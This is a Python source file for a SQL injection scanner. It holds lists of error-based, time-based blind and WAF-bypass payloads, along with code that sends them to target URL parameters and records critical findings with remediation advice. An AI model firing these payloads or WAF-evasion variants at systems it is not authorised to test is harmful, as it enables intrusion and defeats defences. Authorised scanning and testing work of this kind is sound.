"""
SQLi Scanner — Error-based, Boolean-blind, Time-based blind detection
Includes WAF bypass variants (comment injection, encoding, whitespace tricks)
"""

import requests
import time


class SQLiScanner:
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        "`",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' UNION SELECT NULL--",
    ]

    # Time-based blind payloads (MSSQL, MySQL, PostgreSQL, SQLite)
    TIME_PAYLOADS = [
        ("'; WAITFOR DELAY '0:0:5'--",   5, "MSSQL"),
        ("' AND SLEEP(5)--",              5, "MySQL"),
        ("'; SELECT pg_sleep(5)--",       5, "PostgreSQL"),
        ("' AND 1=1 AND SLEEP(5)--",      5, "MySQL"),
    ]

    # WAF bypass variants
    WAF_BYPASS = [
        "' /*!OR*/ '1'='1",           # MySQL inline comment
        "'/**/OR/**/1=1--",           # Comment whitespace
        "' %4fR '1'='1",              # URL encode O
        "' OR 0x313d31--",            # Hex encoding
        "';EXEC(CHAR(87)+CHAR(65))--", # CHAR encoding
    ]

    ERROR_SIGNATURES = [
        "sql syntax", "mysql_fetch", "ora-", "sqlite_", "pg_query",
        "syntax error", "unclosed quotation", "odbc driver",
        "warning: mysql", "you have an error in your sql",
        "microsoft ole db", "jdbc", "sqlexception",
    ]

    def __init__(self, target, endpoints, waf_detected=None):
        self.target = target
        self.endpoints = endpoints
        self.waf_detected = waf_detected
        self.request_count = 0
        self.bypass_rate = 0
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (VulnScan Security Tester)"})
        self.session.timeout = 12

    def run(self):
        findings = []
        bypass_hits = 0
        total_tries = 0

        for endpoint in self.endpoints:
            url = endpoint.get("url", "")
            params = endpoint.get("params", [])

            if not params:
                continue

            for param in params:
                # Error-based detection
                for payload in self.ERROR_PAYLOADS:
                    total_tries += 1
                    try:
                        resp = self.session.get(url, params={param: payload})
                        self.request_count += 1
                        if self._has_sql_error(resp.text):
                            findings.append(self._make_finding(
                                "SQL Injection (Error-Based)", url, param,
                                payload, "critical", "9.8", False
                            ))
                            break
                    except Exception:
                        pass
                    time.sleep(0.05)

                # Time-based blind detection
                for payload, delay, db_type in self.TIME_PAYLOADS:
                    total_tries += 1
                    try:
                        start = time.time()
                        self.session.get(url, params={param: payload}, timeout=delay + 3)
                        elapsed = time.time() - start
                        self.request_count += 1
                        if elapsed >= delay - 0.5:
                            findings.append(self._make_finding(
                                f"SQL Injection (Time-Based Blind, {db_type})",
                                url, param, payload, "critical", "9.8", False
                            ))
                            break
                    except requests.Timeout:
                        # Timeout itself confirms injection
                        findings.append(self._make_finding(
                            f"SQL Injection (Time-Based Blind, {db_type})",
                            url, param, payload, "critical", "9.8", False
                        ))
                        break
                    except Exception:
                        pass

                # WAF bypass attempts (if WAF present)
                if self.waf_detected:
                    for payload in self.WAF_BYPASS:
                        total_tries += 1
                        try:
                            resp = self.session.get(url, params={param: payload})
                            self.request_count += 1
                            if self._has_sql_error(resp.text):
                                bypass_hits += 1
                                findings.append(self._make_finding(
                                    "SQL Injection (WAF Bypass)", url, param,
                                    payload, "critical", "9.8", True
                                ))
                                break
                        except Exception:
                            pass
                        time.sleep(0.1)

        if total_tries > 0:
            self.bypass_rate = round((bypass_hits / total_tries) * 100, 1)

        return findings

    def _has_sql_error(self, body):
        body_lower = body.lower()
        return any(sig in body_lower for sig in self.ERROR_SIGNATURES)

    def _make_finding(self, vuln_type, url, param, payload, severity, cvss, bypass_used):
        return {
            "type": vuln_type,
            "severity": severity,
            "endpoint": f"{url}?{param}=",
            "parameter": param,
            "payload": payload,
            "cvss": cvss,
            "vector": "SQLi",
            "bypass_used": bypass_used,
            "bypass_technique": "WAF evasion via comment/encoding" if bypass_used else None,
            "remediation": (
                "Use parameterized queries / prepared statements exclusively. "
                "Never concatenate user input into SQL strings. "
                "Apply least-privilege DB accounts."
            ),
        }
